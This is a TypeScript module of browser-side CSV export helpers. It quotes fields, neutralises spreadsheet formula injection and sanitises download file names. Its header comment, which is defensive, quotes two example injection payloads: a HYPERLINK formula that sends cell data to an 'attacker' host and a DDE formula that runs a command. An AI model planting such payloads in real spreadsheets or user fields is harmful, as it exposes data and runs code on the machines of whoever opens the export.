/**
 * CSV export helpers.
 *
 * Two independent problems live in spreadsheet exports:
 *
 * 1. Structure: a field containing `,`, `"`, `\r` or `\n` breaks the row unless it
 *    is quoted and inner quotes are doubled (RFC 4180).
 * 2. Formula injection: a cell whose text starts with `=`, `+`, `-`, `@`, a tab,
 *    a carriage return or a NUL byte is interpreted as a formula by Excel and
 *    LibreOffice. A user name such as `=HYPERLINK("http://attacker/?x="&A1)`
 *    therefore becomes a live link (or `=cmd|'/c calc'!A1` worse) the moment an
 *    administrator opens the export. OWASP and ASVS 5.3.10 require the export to
 *    neutralise this.
 *
 * The backend already escapes CSV correctly (see `aether-admin`'s `csv.rs`); this
 * module is the browser-side equivalent so both halves of the product agree.
 */

/** Characters that make a spreadsheet treat the cell as a formula. */
const FORMULA_PREFIXES = ['=', '+', '-', '@', '\t', '\r', '\n', '\0'];

/**
 * Full-width look-alikes.
 *
 * Excel normalises full-width characters in some locales, so `＝SUM(A1)` is still
 * a formula there even though it does not match the ASCII prefix list.
 */
const FULL_WIDTH_FORMULA_PREFIXES = ['＝', '＋', '－', '＠'];

/**
 * Prefix inserted in front of a dangerous cell.
 *
 * A single quote makes the spreadsheet treat the rest as literal text; a tab is
 * the other common choice but it breaks copy/paste into other tools.
 */
const FORMULA_GUARD = "'";

function startsLikeFormula(value: string): boolean {
  // Leading whitespace is ignored by spreadsheets when deciding whether a cell is
  // a formula, so `"  =1+1"` is dangerous too.
  const trimmed = value.replace(/^[\s\u00a0]+/, '');
  if (trimmed.length === 0) return false;
  const first = trimmed[0] as string;
  return (
    FORMULA_PREFIXES.includes(first) ||
    FULL_WIDTH_FORMULA_PREFIXES.includes(first)
  );
}

/**
 * Escapes one CSV field.
 *
 * Always quotes the value: the alternative (quote only when needed) makes the
 * dangerous case depend on the field's content, which is exactly the kind of
 * conditional people forget when they add a column.
 */
export function escapeCsvField(value: unknown): string {
  const text = value === null || value === undefined ? '' : String(value);
  const guarded = startsLikeFormula(text) ? `${FORMULA_GUARD}${text}` : text;
  return `"${guarded.replaceAll('"', '""')}"`;
}

/** Joins one row, escaping every field. */
export function toCsvRow(values: readonly unknown[]): string {
  return values.map(escapeCsvField).join(',');
}

/**
 * Builds a CSV document (CRLF line endings, per RFC 4180).
 *
 * A leading BOM keeps Excel from mangling non-ASCII text; `bom: false` is there
 * for consumers that choke on it.
 */
export function buildCsv(
  rows: readonly (readonly unknown[])[],
  options: { bom?: boolean } = {}
): string {
  const body = rows.map(toCsvRow).join('\r\n');
  return options.bom === false ? body : `\uFEFF${body}`;
}

/**
 * Turns an arbitrary label into something safe to use as a file name.
 *
 * Export file names commonly embed user or batch names; `/` or `..` in those
 * either breaks the download or writes outside the intended folder.
 */
export function sanitizeDownloadFileName(name: string, fallback = 'export'): string {
  const cleaned = name
    // Stripping control characters is the point; the range is intentional.
    .replace(/[\u0000-\u001f\u007f]/g, '') // eslint-disable-line no-control-regex
    // Separators first: `../x` becomes `..-x`, then the dot runs collapse.
    .replace(/[/\\:*?"<>|]/g, '-')
    .replace(/\.{2,}/g, '.')
    .trim()
    .replace(/^[.-]+/, '')
    .slice(0, 120);
  return cleaned.length > 0 ? cleaned : fallback;
}

/** Triggers a client-side download for a CSV document. */
export function downloadCsv(fileName: string, csv: string): void {
  const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
  const url = URL.createObjectURL(blob);
  const link = document.createElement('a');
  link.href = url;
  link.download = sanitizeDownloadFileName(fileName, 'export.csv');
  link.rel = 'noopener';
  // Some browsers ignore `click()` on a detached anchor.
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  // Without this the blob stays alive for the lifetime of the document.
  URL.revokeObjectURL(url);
}
